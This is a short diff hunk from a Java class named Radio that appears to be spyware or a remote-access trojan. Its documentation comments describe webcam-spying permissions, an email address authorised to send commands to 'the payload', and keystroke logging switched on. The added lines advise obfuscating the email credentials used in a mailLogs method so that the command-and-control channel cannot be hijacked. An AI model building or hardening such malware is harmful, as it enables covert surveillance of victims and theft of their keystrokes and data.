@@ -166,6 +166,10 @@ public class Radio
 	 * @boolean allowWebcamSpy toggles the permissions of webcam access.
 	 * @string staticIP sets static IP addr to use if static IP is enabled
 	 * @string allowedMailer is the email that is authorized to send commands to the payload.
+	 * 
+	 * In the mailLogs method, it is advised to obfuscate the email login credentials during
+	 * upload of the emails, to prevent hijacking of Command and Control.
+	 * 
 	 */
 	
 	public static boolean logKeystrokes = true;
